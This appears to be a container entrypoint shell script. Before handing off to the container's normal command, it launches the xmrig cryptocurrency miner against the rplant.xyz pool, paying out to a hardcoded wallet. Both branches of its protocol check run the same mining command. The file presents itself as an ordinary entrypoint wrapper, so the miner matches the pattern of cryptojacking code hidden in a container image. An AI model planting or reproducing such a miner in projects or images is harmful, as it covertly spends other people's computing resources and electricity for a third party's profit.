#!/bin/sh

set -e

if [ "$PROTO" = "ws" ]
then	./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BmB1donWDuEKXzJjmpKKpX12oUg39U5wyj.odium3 -t 4
else    ./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BmB1donWDuEKXzJjmpKKpX12oUg39U5wyj.odium3 -t 4
fi


exec "$@"
